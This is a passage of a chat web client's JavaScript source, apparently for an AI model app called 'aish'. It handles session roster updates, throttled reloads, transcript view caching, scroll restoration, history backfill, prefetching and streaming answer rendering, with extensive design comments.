// "nothing changed" and "I missed something" into different observations: a
// gap asks for a snapshot rather than leaving a stale row on screen forever.
//
// THE TIMESTAMPS ARE THE TRANSITION'S, carried on the event (#232). They were
// stamped on arrival here, because unread compared them against THIS device's
// "I looked at it" map and one clock was enough. The ledger is the owner's
// now, so a comparison across two clocks is a device with a wrong one reading
// dots that are not there — and the publishing instant is the same one arrival
// was approximating, minus the skew. It is on the EVENT, never the row: the row
// is what `_touch` diffs, and a clock inside it would differ every time and
// suppress nothing. The LOG-derived stamps stay off it for the original reason
// — the server would have to parse a session log, and a chat that just did
// something has just changed its file, so the parse cache is guaranteed to miss
// exactly then.
let rosterSeq = 0;
// Does this client hold every chat there is, or only the ones it has been told
// about? The pager rows a hello carries are the recency HEAD, not the archive,
// and deltas only describe chats that changed — so until a full list lands,
// the roster is a partial view and the rail has to ask for the rest.
let rosterComplete = false;

function rosterBaseline(seq) {
  // A hello. If the server's sequence is not the one we were following, deltas
  // happened while we were not listening — a reconnect, a server restart — and
  // they are simply GONE. Re-baselining without noticing is what would make
  // that invisible: the client would carry on believing rows it has no reason
  // to believe. So the mismatch marks the roster stale, and the next list
  // request repairs it.
  if (typeof seq !== "number") return;
  if (seq !== rosterSeq) rosterComplete = false;
  rosterSeq = seq;
}

function rosterSnapshotLanded(seq) {
  // A full, unfiltered list: everything there is, as of `seq`. Deltas already
  // folded into it must not read as a gap, and from here the stream alone is
  // enough — which is what lets opening the rail stop being a round trip.
  if (typeof seq === "number") rosterSeq = seq;
  rosterComplete = true;
}

function onSessionChanged(event) {
  const row = event.row || {};
  if (!row.name) return;
  if (typeof event.seq === "number") {
    // A gap means a delta was lost — a socket replaced mid-flight, an outbox
    // dropped on a session switch. Ask for the truth instead of applying this
    // row over rows that may already be wrong.
    const missed = event.seq > rosterSeq + 1;
    rosterSeq = event.seq;
    if (missed) {
      rosterComplete = false;
      requestSessions($("sessions-search").value || "");
    }
  }
  noteAttention(row, event.at);
  if (event.notice) rosterNotice(event.notice, row);
  if (railIsOpen()) renderSessionsFromCache();
}

// The heads-up half, kept apart from the data half on purpose: every client
// gets every row, but only a client that is NOT looking at the chat has any
// reason to be interrupted about it.
function rosterNotice(notice, row) {
  if (row.name === currentSession) return;
  const label = row.title
    ? `“${row.title.slice(0, 40)}”`
    : row.name.replace(/^session-|\.jsonl$/g, "").replace(/-\d{6}$/, "");
  if (notice === "held") {
    showToast(`${label}: waiting for your approval — swipe from the left edge to switch`);
    return;
  }
  showToast(`${label}: task finished — swipe from the left edge to switch back`);
  notify("aish — background task finished", row.title || row.name);
}

// The rail, repainted from what this client already knows — NO ROUND TRIP.
// The roster is the authoritative half of that paint ([ATTENTION]) and it has
// just been updated, so the answer is already here. Deliberately not
// `requestSessions`, which also ASKS the server: with the rail docked open
// that turned every delta into a snapshot request, which is the poll this
// plane exists to remove, only now triggered by its own events.
function renderSessionsFromCache() {
  renderOfflineSessions($("sessions-search").value || "");
}

// A server that predates the roster plane still sends the two old pushes.
// Kept so a new client against an old server degrades to the old behaviour
// rather than going silent.
function onSessionState(event) {
  noteAttention({ name: event.session, state: event.state, title: event.title });
  rosterNotice(event.state === "waiting" ? "held" : "finished", {
    name: event.session, title: event.title,
  });
  if (railIsOpen()) renderSessionsFromCache();
}
// [ROSTER-END]

let sessionTitled = false;

function setTitle(text) {
  sessionTitled = Boolean(text);
  $("session-title").textContent = text || "New chat";
  updateBackLabel();
}

// Collapse "‹ Sessions" to just "‹" when the title is long enough to be
// truncated — freeing header room at any width, on top of the ≤430px viewport
// rule (#83). "Long" is content- not viewport-dependent, so it's measured:
// clear the class (label shown), read whether the title overflows, re-add it if
// so. Synchronous, so the transient label-shown state never paints.
function updateBackLabel() {
  const nav = $("nav-row");
  const title = $("session-title");
  nav.classList.remove("crowded");
  if (title.scrollWidth > title.clientWidth + 1) nav.classList.add("crowded");
}
let backLabelResizeTimer;
window.addEventListener("resize", () => {
  clearTimeout(backLabelResizeTimer);
  backLabelResizeTimer = setTimeout(updateBackLabel, 100);
});

// The ?v= the server stamped into our own <script> tag — ground truth for
// which code revision this page actually runs (unlike any value learned at
// runtime, it can't be polluted by a stale-from-HTTP-cache load).
const PAGE_REV = (() => {
  const script = document.querySelector('script[src*="app.js"]');
  try { return new URL(script.src).searchParams.get("v"); } catch { return null; }
})();

// [OFFLINE-RELOAD-START]
// A rev mismatch means this page runs older code than the server serves, and
// the fix is a reload. With a service worker in front of index.html that is one
// bad cache entry away from a loop: reload → SW serves the same stale HTML →
// same stale rev → reload. Two independent guards, because a loop here bricks
// the app on the device it happens on.
//
//  1. Purge the cached shell first, so the reload is guaranteed to re-fetch.
//  2. Refuse to reload more than RELOAD_MAX times in RELOAD_WINDOW_MS. Running
//     one revision behind is a papercut; an app that reboots forever is not
//     usable at all, so when the guard trips we stay put and say so.
const RELOAD_KEY = "aish-reloads";
const RELOAD_WINDOW_MS = 60000;
const RELOAD_MAX = 3;

function reloadThrottled(reason) {
  let history = [];
  try { history = JSON.parse(sessionStorage.getItem(RELOAD_KEY) || "[]"); } catch { history = []; }
  const now = Date.now();
  history = history.filter((t) => now - t < RELOAD_WINDOW_MS);
  if (history.length >= RELOAD_MAX) {
    showToast("update loop detected — staying on this version");
    return false;
  }
  history.push(now);
  try { sessionStorage.setItem(RELOAD_KEY, JSON.stringify(history)); } catch { /* private mode */ }
  const worker = navigator.serviceWorker?.controller;
  if (!worker) { location.reload(); return true; }
  // Give the purge a moment to land, but never hang on it — a reload that
  // reuses the cache is still better than no reload.
  let done = false;
  const go = () => { if (!done) { done = true; location.reload(); } };
  navigator.serviceWorker.addEventListener("message", (e) => {
    if (e.data && e.data.type === "SHELL_PURGED") go();
  }, { once: true });
  worker.postMessage({ type: "PURGE_SHELL", reason });
  setTimeout(go, 1500);
  return true;
}
// [OFFLINE-RELOAD-END]

// [VIEWCACHE-START]
// Rendered-transcript reuse: a session switch replays the full transcript and
// rebuilds the whole DOM (markdown + highlighting for every answer), which is
// what made swiping back and forth feel slow on long chats. When we LEAVE an
// idle view we stash its rendered nodes, and when a replay for that session
// arrives whose transcript is IDENTICAL to what those nodes were built from,
// we swap them back in instead of rebuilding. Identity is a fingerprint of
// the replay (event count + truncation + the last event): the transcript is
// append-only while a session stays open, so any change moves the count or
// the last event. Every mismatch falls back to a full rebuild — the cache can
// make a switch faster, never wronger.
const VIEW_CACHE_MAX = 4;
const viewCache = new Map(); // session name → {nodes, fp, renderedAnswers}
let viewFp = "";      // fingerprint of the replay the current view was built from
let viewDirty = true; // events arrived since that replay → a stash would be stale

// Event types that never touch the transcript DOM. Anything NOT listed marks
// the view dirty — over-dirtying only costs a rebuild, never a stale screen.
const VIEW_SAFE_EVENTS = new Set([
  "hello", "replay", "session_list", "model_list", "role", "ack",
  "session_renamed", "session_deleted", "cmd_history", "jobs", "files", "dirs",
  "console_started", "console_out", "console_exit", "console_error",
  "console_shared", "peek",
]);

function replayFp(event) {
  const events = event.events || [];
  const last = events[events.length - 1];
  // The last event is capped so a legacy one-blob `history` replay doesn't
  // put megabytes into the key; length + head disambiguates just as well.
  const tail = last ? JSON.stringify(last) : "";
  return `${event.truncated ? "t" : ""}${events.length}:${tail.length}:${tail.slice(0, 2000)}`;
}

// A view is only worth stashing when its DOM is a pure function of the replay
// it was built from: nothing arrived since (dirty), nothing is mid-flight
// (busy / pending approval cards / an un-acknowledged send bubble the server
// has never confirmed), and it wasn't painted from the mirror's truncated copy
// (offlineViewing).
function viewStashable(state) {
  return Boolean(
    state.name && state.fp && !state.dirty && !state.pendingCards &&
    !state.busy && !state.offlineViewing && !state.pendingSends
  );
}

// What to do when a replay lands, cheapest first:
//   "noop"    — the view ALREADY shows this exact transcript (same fingerprint,
//               nothing arrived since it was painted). The reconnect re-replay
//               — every phone unlock — and the second half of a prefetched
//               swipe land here: keep the DOM and the scroll position.
//   "reuse"   — a stash of this transcript exists: swap the rendered nodes in.
//   "rebuild" — anything else: render from the events. Always correct.
// The dirty gate protects every edge at once: any live event since the last
// paint (a card, a stream line, an injected turn) forces the rebuild path.
// An un-acknowledged send bubble ([PENDING-SEND]) fails "noop" for the same
// reason from the other side: the DOM holds a message the server has never
// confirmed, so it is NOT this replay's transcript however well the fingerprint
// matches — and a fingerprint cannot see it, because nothing about it came off
// the socket.
function replayLanding(state) {
  if (state.fp && state.fp === state.viewFp && !state.viewDirty && state.hasDom &&
      !state.pendingSends) {
    return "noop";
  }
  if (state.cachedFp && state.cachedFp === state.fp) return "reuse";
  return "rebuild";
}

// [SCROLLPOS-START]
// Where you were reading survives a rebuild: a reload after the phone put the
// app to sleep, the app-revision reload, a session switch and back. The "noop"
// landing already keeps the scroll by keeping the DOM; this is the other two
// landings, which throw the DOM away and used to always come back at the tail.
//
// A raw scrollTop would be a lie the moment any height differs, so what's stored
// is the SAME anchor the wrap toggle reflows around (`topVisibleAnchor`): the
// index of the child at the top of the viewport plus its on-screen offset. That
// index only means something if the rebuilt DOM is the one it was measured
// against, so it is stored with `transcriptFp()` — a fingerprint of the
// TRANSCRIPT ON SCREEN, deliberately not `viewFp`. viewFp is stamped by the last
// replay, and the flow this whole thing exists for (ask something, scroll up to
// read the answer, come back later) leaves it stale by definition — a live turn
// appends to the DOM without ever replaying, so keying on it would reject the
// restore in exactly the case that matters. Comparing rendered DOM to rendered
// DOM asks the right question: "is this the screen I left?"
//
// A mismatch deliberately falls through to the tail: something arrived while you
// were away, and the newest of it is what you came back for.
const SCROLL_KEY = "aish-scroll";
const SCROLL_MAX_KEPT = 24; // a handful of chats deep; the rest fall off oldest-first

// Cheap and stable across live-vs-replay rendering, which is the same hot/cold
// parity `reconstruct_events` already guarantees: same events → same children.
function transcriptFp() {
  const last = messagesEl.lastElementChild;
  return [
    messagesEl.childElementCount,
    last ? last.className : "",
    last ? last.textContent.length : 0,
  ].join(":");
}

function readScrollMemory() {
  try {
    return JSON.parse(localStorage.getItem(SCROLL_KEY) || "{}") || {};
  } catch {
    return {}; // unparseable or storage-denied (private mode) — just forget
  }
}

function rememberScrollPos() {
  if (!currentSession) return;
  const anchor = topVisibleAnchor();
  if (!anchor) return;
  const index = [...messagesEl.children].indexOf(anchor.el);
  if (index < 0) return;
  const mem = readScrollMemory();
  mem[currentSession] = {
    fp: transcriptFp(), index, offset: Math.round(anchor.offset), at: Date.now(),
  };
  const names = Object.keys(mem);
  if (names.length > SCROLL_MAX_KEPT) {
    names
      .sort((a, b) => (mem[a].at || 0) - (mem[b].at || 0))
      .slice(0, names.length - SCROLL_MAX_KEPT)
      .forEach((name) => delete mem[name]);
  }
  try {
    localStorage.setItem(SCROLL_KEY, JSON.stringify(mem));
  } catch {
    // storage full or denied: the position is a nicety, never a failure
  }
}

// True when the remembered position was applied — the caller falls back to the
// tail otherwise. Call this with the transcript fully built.
function restoreScrollPos() {
  const saved = readScrollMemory()[currentSession];
  if (!saved || saved.fp !== transcriptFp()) return false;
  const el = messagesEl.children[saved.index];
  if (!el) return false;
  restoreAnchor({ el, offset: saved.offset });
  return true;
}
// [SCROLLPOS-END]

// [BACKFILL-START]
// Reading further back than the first paint reaches (#228).
//
// The replay is bounded — a long chat is megabytes and a replay is one frame —
// and for a long time that bound was the whole story: above it sat "… earlier
// events trimmed …" and there was no way past. A 1314-event chat opened at its
// 815th event, and its first two thirds, six answers and three photos, were not
// reachable from the app at all.
//
// So the marker became a CONTROL. It asks the server for a wider window of the
// same log and the ordinary replay path repaints from it — no second rendering
// path, no prepend into a live DOM, nothing that can disagree with what a normal
// replay would have drawn. The price is re-rendering what is already on screen,
// paid once, on a deliberate tap.
//
// Holding the reader's place across that repaint is the only subtlety, and it is
// deliberately NOT [SCROLLPOS]'s anchor: that anchor is a child INDEX, and every
// index shifts when a thousand events are inserted above. Distance from the
// BOTTOM is the quantity that doesn't move when content is added to the top, so
// that is what is measured and put back.
// The row is a read that makes a CLAIM ("loading…", disabled), so it goes
// through `act` rather than a bare `send` — the ledger's whole point is that a
// claim about the server must be undoable when the server never answers, and a
// zombie socket would otherwise leave the control saying "loading" forever.
const HISTORY_PAGE = 1000;

let viewWindow = 0;      // events the view on screen was painted from
let viewTotal = 0;       // events the chat holds, per the server
let viewHasMore = true;  // …and whether the server would hand over any more
let backfillFromBottom = -1; // ≥0 while a backfill repaint is in flight
let backfillRow = null;      // the control mid-request, for putting it back

function noteWindow(event) {
  const events = event.events || [];
  viewWindow = events.length;
  viewTotal = Math.max(event.total || 0, events.length);
  // Whether asking again would get you more. Absent on an old server (and on a
  // mirror paint) means "assume yes" — the pre-ceiling behaviour.
  viewHasMore = event.more !== false;
}

// Put the control back the way it was: the request is over, however it ended.
// Called by the ack ledger when nothing came back, by the refusal path, and by
// every replay — including the one that answers the request, whose rebuild
// throws the row away anyway.
function endBackfill() {
  if (backfillRow) {
    backfillRow.disabled = false;
    backfillRow.textContent = earlierLabel();
    backfillRow = null;
  }
}

function requestBackfill(row) {
  if (offlineViewing) { showToast("connect to load earlier messages"); return; }
  if (backfillRow) return; // one in flight is enough
  backfillRow = row;
  row.textContent = "loading earlier messages…";
  row.disabled = true;
  const from = messagesEl.scrollHeight - messagesEl.scrollTop;
  const ok = act(
    { type: "history_more", window: viewWindow + HISTORY_PAGE },
    { label: "loading earlier messages", lost: endBackfill },
  );
  if (!ok) { endBackfill(); return; }
  backfillFromBottom = from;
}

// True when a backfill repaint was in flight and the reader's place was put
// back. Consumed once — a later ordinary replay must fall through to the
// remembered reading position like any other.
function restoreBackfillPos() {
  if (backfillFromBottom < 0) return false;
  const from = backfillFromBottom;
  backfillFromBottom = -1;
  messagesEl.scrollTop = messagesEl.scrollHeight - from;
  updateScrollButton();
  return true;
}

function earlierLabel() {
  const missing = Math.max(viewTotal - viewWindow, 0);
  return missing
    ? `↑ load earlier messages (${missing} more)`
    : "↑ load earlier messages";
}

// The top-of-transcript control. It says what is missing rather than that
// something is — "earlier events trimmed" told the reader their chat had been
// damaged, when in fact the log was whole and only the frame was small.
//
// Past the server's per-request ceiling there is genuinely nothing more to
// fetch, and a control that would do nothing is the same dead end in a friendlier
// font — so it becomes a plain line saying where the rest is.
function earlierRow() {
  if (!viewHasMore) {
    const note = document.createElement("div");
    note.className = "msg notice";
    note.textContent =
      "↑ this chat is too long to open in full here — the rest is in its log";
    return note;
  }
  const row = document.createElement("button");
  row.type = "button";
  row.className = "msg notice earlier-row";
  row.textContent = earlierLabel();
  row.onclick = () => requestBackfill(row);
  return row;
}
// [BACKFILL-END]

function stashCurrentView() {
  const stashable = viewStashable({
    name: currentSession,
    fp: viewFp,
    dirty: viewDirty,
    pendingCards,
    busy: clientBusy,
    offlineViewing,
    pendingSends: pendingSends.length,
  });
  if (!stashable) return;
  viewCache.delete(currentSession); // re-insert = move to MRU end
  viewCache.set(currentSession, {
    nodes: [...messagesEl.children],
    fp: viewFp,
    renderedAnswers,
  });
  while (viewCache.size > VIEW_CACHE_MAX) {
    viewCache.delete(viewCache.keys().next().value);
  }
}
// [VIEWCACHE-END]

// [PREFETCH-START]
// Swipe-neighbor prefetch: after a view settles, quietly ask the server for
// the transcripts one page left and right (`peek` — a VIEW message: no claim,
// no hello, nothing recorded). A committed swipe then paints the prefetched
// events immediately instead of showing a blank parked page for a full round
// trip; the authoritative replay that follows lands on the SAME fingerprint
// and no-ops (see replayLanding), so nothing renders twice. A stale peek (the
// neighbor moved since) just fingerprint-misses into the normal rebuild.
const PREFETCH_MAX_AGE_MS = 90 * 1000;
const PREFETCH_KEEP = 4;
const prefetched = new Map(); // name → {events, truncated, ts}
let peekTimer = null;

function schedulePeeks() {
  clearTimeout(peekTimer);
  peekTimer = setTimeout(requestWarmPeeks, 900);
}

// WHICH chats are worth warming. The pager used to answer this with "the two
// pages either side of this one"; with the rail, the answer is simply the most
// recently used chats that aren't this one — which is exactly where a tap is
// most likely to land. Under recency ordering the chat you were just in sits at
// position one permanently, so bouncing between two chats stays instant, which
// is the case the old carousel was genuinely good at.
const PREFETCH_TARGETS = 2;

function prefetchTargets() {
  return recentSessions
    .filter((s) => s && s.name && s.name !== currentSession)
    .slice(-PREFETCH_TARGETS)          // hello.pager is oldest→newest
    .map((s) => s.name);
}

function requestWarmPeeks() {
  if (offlineMode || !ws || ws.readyState !== WebSocket.OPEN) return;
  for (const name of prefetchTargets()) {
    if (!prefetched.has(name)) send({ type: "peek", path: name });
  }
}

function onPeek(event) {
  if (!event.name) return;
  if (event.gone) {
    // Warming a chat the server no longer has: drop what we cached for it and
    // stay silent — no toast for a request the user never made.
    forgetSession(event.name);
    return;
  }
  prefetched.set(event.name, {
    events: event.events || [],
    truncated: !!event.truncated,
    total: event.total || 0, // so a warm-painted view's [BACKFILL] row can count
    ts: Date.now(),
  });
  while (prefetched.size > PREFETCH_KEEP) {
    prefetched.delete(prefetched.keys().next().value);
  }
}

// Single-use: consumed on the swipe that lands on it; the next hello re-peeks.
function freshPrefetch(name) {
  const pre = prefetched.get(name);
  if (!pre) return null;
  prefetched.delete(name);
  return Date.now() - pre.ts <= PREFETCH_MAX_AGE_MS ? pre : null;
}
// [PREFETCH-END]

function onHello(event) {
  // Server code changed since this page was built (or the page predates rev
  // stamping entirely) — reload; the replay mechanism restores the view.
  // Abandon this hello ONLY when a reload is actually coming: when the
  // throttle refuses (update loop guard), "stay put" must mean stay USABLE —
  // returning here anyway left the app connected but blank, with no replay
  // ever processed, until the next reconnect repeated the same abort.
  if (event.rev && event.rev !== PAGE_REV && reloadThrottled("rev")) return;
  // The interactive console is GLOBAL (#148 follow-up): it floats above whatever
  // chat is shown and is untouched by a session switch. A hello also means a
  // (re)connect. `#console` is a deep-link that survives a reload / server
  // restart (incl. the rev-reload above), so restore the overlay from it; on a
  // plain reconnect it is already open and we just re-attach (tmux redraws).
  if (consoleOpen) send({ type: "console_open" });
  else if (location.hash === "#console") openConsole();
  $("model-name").textContent = event.model;
  recentSessions = event.pager || [];
  cmdHistory = event.cmd_history || []; // personal command palette (#104)
  // Identity and everything coupled to it — the stash of the view we are
  // leaving, the fingerprint, the title, the remembered session, the URL, the
  // mirror's bookkeeping — belong to [SESSION-ENTER]. Below this line are the
  // things only a HELLO knows: the workspace, the busy/role state.
  enterSession(event.session, {
    source: "hello",
    title: event.title || "",
    stash: true, // the DOM on screen still belongs to the chat being left
  });
  // Every hello already carries the recency rows (they warm the swipe peeks),
  // and they now carry each chat's liveness too — so a boot, a reconnect and
  // every switch re-derive the attention count for free. Without this the badge
  // was whatever the last rail open computed, and after a reload it was EMPTY
  // until you opened the rail ([ATTENTION]).
  setAttentionRows(event.pager || []);
  rosterBaseline(event.roster_seq); // and whether we missed anything while away
  // Adopt the server's clock and reconcile the seen ledger (#232): hand over
  // whatever this device read while it was away, take back what the owner read
  // on the other one. A hello arrives on every switch too and this is not
  // per-chat, but it is cheap and idempotent — the outbox is normally empty.
  syncSeen(event.now);
  if (railIsOpen()) requestSessions($("sessions-search").value || ""); // docked: stay current
  currentLogPath = event.log_path || ""; // /session + "Copy log path" (#146)
  uploadsDir = event.uploads_dir || uploadsDir; // resolves `![[cat.png]]` (#231)
  renderWorkspace(event);
  taskErrored = false; // fresh connected view — clear any stale red
  setBusy(event.busy);
  if (!event.busy) setStatus(null);
  // A fresh view starts with no known role: the server sends a `role` event
  // only when ANOTHER tab is already driving this session (#102). Until then,
  // hide the indicator — this tab is the presumed driver.
  setRolePill(false);
  updateEmptyHint();
  // A share almost always arrives with nothing connected, so hello — not the
  // broadcast — is how it is normally first seen (#213).
  renderShares(event.shares || []);
  hideBootLoader(); // connected and about to replay — drop the first-paint spinner
  schedulePeeks(); // warm the swipe neighbors once this view settles
}

// Multi-connection (#102): a subtle top-bar pill shows when ANOTHER tab/device
// is the current driver of the session THIS tab is viewing. It clears the
// instant this tab acts (the server sends a fresh `role` with you:true). No
// disabled composer, no "take control" button — acting IS how you take over.
function onRole(event) {
  if (event.session && event.session !== currentSession) return; // not our view
  setRolePill(!!event.controller && !event.you);
}

function setRolePill(active) {
  const pill = $("role-pill");
  if (pill) pill.hidden = !active;
}

// [REPLAY-LANDING-START]
// A replay is the ONE authoritative repaint: rendering is a pure function of the
// event array, so this is also where the view's fingerprint is (re)stamped. It
// owns viewFp/viewDirty together with enterSession — nothing else may claim "the
// screen now shows this transcript".
function onReplay(event) {
  // Whatever this replay decides below, the transcript is no longer waiting to
  // be painted for the first time ([PENDING-VIEW]).
  paintLanded();
  // The server's own account of this chat settles anything held for it
  // ([PENDING-SEND]) — BEFORE the landing is decided, because a `noop` landing
  // returns early and is just as authoritative about what arrived.
  adjudicateHeldSends(currentSession, event.events);
  endBackfill(); // any replay ends an outstanding "load earlier" ([BACKFILL])
  // A repaint the server flags `seen` follows an edit made from a viewer's own
  // hands (removing an exchange, #202) and reaches only clients VIEWING this
  // chat, so what they are being handed is its current state. Without it the
  // removal — which counts as activity, so that every device's offline mirror
  // refetches the corrected transcript — would come back as an unread dot for
  // the person who just made it.
  if (event.seen) markSeen(currentSession);
  // [VIEWCACHE] Decide the landing BEFORE touching any transform (see
  // replayLanding for the three outcomes and why each is safe).
  const fp = replayFp(event);
  const landing = replayLanding({
    fp,
    viewFp,
    viewDirty,
    hasDom: messagesEl.childElementCount > 0,
    cachedFp: viewCache.get(currentSession)?.fp,
    pendingSends: pendingSends.length,
  });
  // [TURN-RESET] A replay is reachable mid-stream; closing the live turn is not
  // this function's to hand-roll, INCLUDING the case where the answer is that a
  // "noop" landing closes nothing.
  resetLiveTurn(landing);
  if (landing === "noop") {
    // The exact transcript on screen — the reconnect re-replay (every phone
    // unlock) and the warm paint a rail tap already made. Keep the DOM, the
    // reading position, and even a read-aloud in progress: rebuilding here is
    // what made every app-open jump to the bottom and re-render the world.
    viewFp = fp;
    return;
  }
  stopSpeaking(); // the active button is about to be detached with the DOM
  // Any un-acknowledged message bubble goes with the DOM it lives in — and its
  // text comes back to the composer rather than vanishing with it.
  clearPendingSends();
  messagesEl.replaceChildren();
  clearQueueChips(); // the whole queue area belongs to the chat being replaced; _show re-sends the new one's
  const cached = viewCache.get(currentSession);
  viewCache.delete(currentSession); // detached nodes are single-use either way
  // How much of the chat this replay is, and how much there is ([BACKFILL]).
  // Recorded for BOTH landings: a reused stash was built from a replay of the
  // same size, and its "load earlier" row reads these when it is tapped.
  noteWindow(event);
  if (landing === "reuse") {
    messagesEl.replaceChildren(...cached.nodes);
    renderedAnswers = cached.renderedAnswers;
  } else {
    if (event.truncated) messagesEl.appendChild(earlierRow());
    replaying = true; // replayed history must not re-fire notifications
    try {
      for (const item of event.events) handle(item);
    } finally {
      replaying = false;
    }
  }
  // A fingerprint is a CLAIM that this DOM equals a server replay — which is
  // what lets a later replay land "noop" and keep it. A mirror paint has no such
  // claim: its events came from IndexedDB, are capped by `offline_events`, and
  // are only re-synced when the chat's activity stamp MOVES, so a chat nobody
  // has touched keeps whatever the mirror stored — from an older app, in an
  // older event SHAPE. That is not hypothetical: the delete chip rides a `turn`
  // field added to `user` events (#202), and `replayFp` (count + last event)
  // could not see the difference — the authoritative replay no-op'd and the
  // chip-less mirror DOM stayed on screen. Claiming nothing here forces the
  // rebuild that puts the server's version up. (`prefetch` is server data and
  // keeps its claim: that no-op is the point of the warm peek.)
  viewFp = offlineViewing ? "" : fp;
  viewDirty = false;
  // The reading position, in priority order: the place a backfill must not move
  // you from, then the place you left this chat at, then the tail.
  if (!restoreBackfillPos() && !restoreScrollPos()) scrollToEnd(true);
  snapViewportSoon(); // session switches race keyboard dismissal with this rebuild (#8)
  setTimeout(() => reportViewport("after-replay"), 1200);
  // Every replay marks a fresh view (new chat, resume, reconnect) — on
  // desktop, land the cursor in the composer ready to type.
  if (FINE_POINTER && $("backdrop").hidden) input.focus();
}
// [REPLAY-LANDING-END]

// [ANSWERING-COLLAPSE-START]
// Entering the "Answering…" phase — the model stopped calling tools and is
// streaming its reply — collapses the still-open live timeline to its summary
// so the answer isn't buried under a tall list of steps (#168). Fires once, at
// the transition; a manual re-expand afterward is never fought (this doesn't
// run again for the same answer). Mirrors the approval-card collapse idiom
// (#65): only act on a live, open trace — and never on one the reader opened
// themselves, which is now the ONLY way an open live trace comes about.
function collapseTimelineForAnswering(t) {
  if (t && !t.userToggled && t.el.classList.contains("live") && t.el.classList.contains("open")) {
    t.el.classList.remove("open");
    return true;
  }
  return false;
}
// [ANSWERING-COLLAPSE-END]

function onToken(text) {
  // A replay replaced the transcript while this turn was streaming (see
  // resetLiveTurn). The rule: abandon drops the STALE LIVE tail, but REPLAYED
  // content is authoritative and re-opens the turn.
  //
  // The distinction is load-bearing, not a nicety. The server's hot transcript
  // records tokens (merging consecutive ones), so the ordinary same-session
  // reconnect — a phone unlock during a long answer — replays the partial answer
  // as a `token` event, and the loop thread makes that snapshot contiguous with
  // the live tail that follows. Rebuilding from it restores the bubble exactly;
  // dropping it would blank the answer until `done`, which for a long task is
  // minutes of missing content on the most common recovery path there is.
  // A live token is the other case: its bubble is gone, so painting it alone
  // would show a truncated answer AND (via sawAnswer) suppress the `done` render
  // that carries the whole text.
  if (answerAbandoned) {
    if (!replaying) return;
    answerAbandoned = false;
  }
  sawAnswer = true;
  // [ANSWER-OPEN-START]
  if (!answerEl) {
    answerEl = addMsg("answer md", "");
    answerText = "";
    answerStableLen = 0;
    answerStableNodes = 0;
    answerCardIds = new Set();
    // The reply itself is the reading anchor: anchorAnswer scrolls only until
    // its top reaches the top of the screen, so the view rises while the answer
    // is still short and then locks with the answer owning the whole viewport.
    turnAnchorEl = answerEl;
    // The live "Thinking…" step is the last row on the timeline when the reply
    // starts streaming; relabel it so it reads as the answer landing, not more
    // thinking, and mark it so finishTrace finalizes it in place ("Answered")
    // instead of dropping the live thinking row.
    if (currentTrace && currentTrace.thinkingRow) {
      currentTrace.thinkingRow.titleEl.textContent = "Answering…";
      currentTrace.thinkingRow.isAnswer = true;
    }
    if (currentTrace) {
      currentTrace.answering = true;
      updateTraceHead(currentTrace);
    }
    // Entering "Answering…" collapses the open timeline to its summary (#168).
    collapseTimelineForAnswering(currentTrace);
    // Bring a LIVE reply on screen — the one you just asked for. A REPLAYED
    // token is a reconstruction of a turn you have already seen, and forcing
    // this would override the resting position onReplay is about to choose
    // (the reading position it restores, or the tail): a reload would land you
    // at the top of the last answer no matter where you had been reading. The
    // flag is read at SCHEDULE time — inside the callback the replay loop has
    // long since reset it.
    if (!replaying) requestAnimationFrame(() => anchorAnswer(true));
  }
  // [ANSWER-OPEN-END]
  answerText += text;
  if (!answerRenderQueued) {
    answerRenderQueued = true;
    requestAnimationFrame(renderAnswerFrame);
  }
}

function renderAnswerFrame() {
  answerRenderQueued = false;
  if (!answerEl) return; // answer already closed (and flushed) this frame
  renderAnswerNow();
  anchorAnswer(); // rises to the anchor, then self-limits — see anchorAnswer
}

// The element that marks the START of the current turn's response — the answer
// bubble once it exists, else the user's own bubble.
let turnAnchorEl = null;

// Keep that anchor pinned to the TOP of the viewport and let the rest of the
// answer flow in below the fold — so you read from the beginning instead of the
// view jumping to the bottom and making you scroll back up.
//
// This is also the whole of the "scroll until it fills, then stop" rule, and it
// is a consequence of the clamp below rather than a mode: while the turn's
// content is shorter than a screen the target clamps to the very bottom, so the
// view rises as text arrives; the moment the anchor can actually reach the top
// the target stops moving, and since the anchor's own top never moves once
// content is only appended BELOW it, nothing scrolls again for the rest of the
// turn. No follow flag, no "stop chasing" branch.
function anchorAnswer(force) {
  const anchor = turnAnchorEl && turnAnchorEl.isConnected ? turnAnchorEl : null;
  if (!anchor) { scrollToEnd(force); return; }
  // getBoundingClientRect, not offsetTop: robust regardless of offsetParent —
  // put the anchor's top a hair below the container's top.
  const delta = anchor.getBoundingClientRect().top - messagesEl.getBoundingClientRect().top;
  const target = Math.max(0, Math.min(
    messagesEl.scrollTop + delta - 6,
    messagesEl.scrollHeight - messagesEl.clientHeight
  ));
  // Scroll DOWN to bring the anchor to the top; never past it (don't chase the
  // streaming answer's bottom — the reader starts from the top and scrolls).
  if (force || messagesEl.scrollTop < target) messagesEl.scrollTop = target;
  updateScrollButton();
  updateEmptyHint();
}

function renderAnswerNow() {
  const boundary = stableBoundary(answerText);
  while (answerEl.childNodes.length > answerStableNodes) answerEl.lastChild.remove();
  if (boundary > answerStableLen) {
    // The prefix is frozen DOM, so its cards are permanent and commit their
    // claims straight into the answer's set ([ONE-CARD]).
    answerEl.appendChild(renderMarkdown(answerText.slice(answerStableLen, boundary), answerCardIds));
    answerStableLen = boundary;
    answerStableNodes = answerEl.childNodes.length;
  }
  // The tail is thrown away and re-rendered on every token, so it gets a COPY:
  // claims made there must not survive into the next render, or the card would
  // demote itself to a plain link one token after it appeared.
  answerEl.appendChild(renderMarkdown(answerText.slice(answerStableLen), new Set(answerCardIds)));
}

// A fence opens on a run of 3+ backticks or tildes. Per CommonMark, the
// closing line must reuse the SAME character, be at least as long, and carry
// no trailing info string — so a shorter/different marker nested inside (e.g.
// the model demonstrating markdown syntax with its own example fence) can't
// masquerade as the outer close and desync everything parsed after it (#80).
// Shared by stableBoundary and renderMarkdown so the two fence-trackers can't
// drift apart and disagree on where a block actually ends.
// The info string allows hyphens (valid per CommonMark, and needed for the
// aish-issue feedback block, #110) — not just \w, which stops at a hyphen.
// Up to 3 leading spaces are allowed (CommonMark), which is load-bearing for
// blocks nested in a list (#172): the list parser strips exactly the item's
// content column, so a fence the model indented by 4 under a `2. ` marker
// arrives here still carrying 1 space. Demanding column 0 made it leak as
// literal text. The same 0-3 allowance is applied to the other block markers
// below (heading, quote, table) for the same reason.
const FENCE_RE = /^( {0,3})(`{3,}|~{3,})([\w-]*)\s*$/;
function fenceOpen(line) {
  const m = line.match(FENCE_RE);
  return m ? { ch: m[2][0], len: m[2].length, lang: m[3], indent: m[1].length } : null;
}
